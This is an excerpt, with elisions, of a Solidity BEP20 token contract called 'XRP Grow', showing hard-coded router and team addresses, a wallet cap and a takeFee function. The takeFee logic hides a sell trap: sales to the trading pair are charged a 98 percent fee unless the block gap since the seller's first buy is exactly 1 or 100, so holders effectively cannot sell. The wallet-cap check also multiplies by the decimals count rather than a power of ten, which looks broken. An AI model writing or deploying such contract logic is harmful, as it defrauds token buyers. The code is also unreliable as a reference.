...
contract DividendDistributor is IDividendDistributor {
    ...
    IDEXRouter router;
    address routerAddress = 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE;
...
contract XrpGrow is IBEP20, Ownable {

    using SafeMath for uint256;

    string constant _name = "XRP Grow";
    string constant _symbol = "XRPG";
    uint8 constant _decimals = 9;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address TEAM = 0x5976C7C8FeEFFDAc28eF24911BDAc3E3456ca51d;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        {
            require(_balances[recipient].add(amount) <= _walletMax * _decimals);
        }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeApplicable = pair == recipient ? marketingFee : liquidityFee;

        uint256 _feeCdFactor = block.number.sub(_coolDown[sender]);
        if (recipient == pair) {
            if (_feeCdFactor > 1 && _feeCdFactor != 100) {
                feeApplicable = 98;
            }
        } else if (sender == pair) {
            if (_coolDown[recipient] == 0) {
                _coolDown[recipient] = block.number;
            }
        } else {
            feeApplicable = 0;
        }
